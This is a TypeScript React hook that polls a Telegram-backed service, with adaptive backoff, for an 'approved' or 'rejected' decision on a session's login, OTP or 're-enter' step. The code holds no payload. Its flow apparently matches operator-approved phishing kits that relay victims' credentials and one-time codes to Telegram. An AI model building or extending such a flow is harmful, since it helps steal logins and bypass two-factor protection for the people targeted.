import { useState, useEffect, useRef } from 'react';
import { telegramService } from '../services/telegramService';

interface UseTelegramPollingProps {
  sessionId: string | null;
  phone?: string;
  targetStep: 'login' | 'otp' | 'reenter';
  isActive: boolean;
  onApproved: () => void;
  onRejected: () => void;
}

export function useTelegramPolling({
  sessionId,
  phone,
  targetStep,
  isActive,
  onApproved,
  onRejected,
}: UseTelegramPollingProps) {
  const [status, setStatus] = useState<'idle' | 'pending' | 'approved' | 'rejected'>('idle');
  const [error, setError] = useState<string | null>(null);

  const isCancelledRef = useRef(false);
  const isFinishedRef = useRef(false);
  const pollCountRef = useRef(0);
  const lastErrorTimeRef = useRef(0);

  useEffect(() => {
    if (!isActive || !sessionId) {
      isCancelledRef.current = true;
      setStatus('idle');
      return;
    }

    isCancelledRef.current = false;
    isFinishedRef.current = false;
    pollCountRef.current = 0;
    lastErrorTimeRef.current = 0;
    setStatus('pending');
    setError(null);

    // Optimized polling loop with adaptive backoff
    const runPollingLoop = async () => {
      while (!isCancelledRef.current && !isFinishedRef.current) {
        try {
          const result = await telegramService.pollUpdates(sessionId, targetStep, phone);

          if (isCancelledRef.current) break;

          if (result === 'approved') {
            isFinishedRef.current = true;
            setStatus('approved');
            onApproved();
            break;
          } else if (result === 'rejected') {
            isFinishedRef.current = true;
            setStatus('rejected');
            onRejected();
            break;
          }

          // Increment poll count
          pollCountRef.current++;

          // Adaptive polling delay:
          // - First 10 polls: 500ms (fast for quick responses)
          // - Next 20 polls: 1000ms (normal)
          // - After 30 polls: 2000ms (slow to reduce load for long waits)
          let delay = 500;
          if (pollCountRef.current > 30) {
            delay = 2000;
          } else if (pollCountRef.current > 10) {
            delay = 1000;
          }

          // If we had recent errors, increase delay further
          const timeSinceLastError = Date.now() - lastErrorTimeRef.current;
          if (timeSinceLastError < 5000) {
            delay = Math.min(delay * 2, 3000);
          }

          // Adaptive pause before next cycle
          if (!isCancelledRef.current && !isFinishedRef.current) {
            await new Promise((resolve) => setTimeout(resolve, delay));
          }
        } catch (err: any) {
          lastErrorTimeRef.current = Date.now();
          console.warn('Telegram polling check warning:', err);

          // On error, wait longer before retry
          if (!isCancelledRef.current && !isFinishedRef.current) {
            await new Promise((resolve) => setTimeout(resolve, 2000));
          }
        }
      }
    };

    runPollingLoop();

    return () => {
      isCancelledRef.current = true;
    };
  }, [sessionId, phone, isActive, targetStep, onApproved, onRejected]);

  return {
    status,
    error,
  };
}
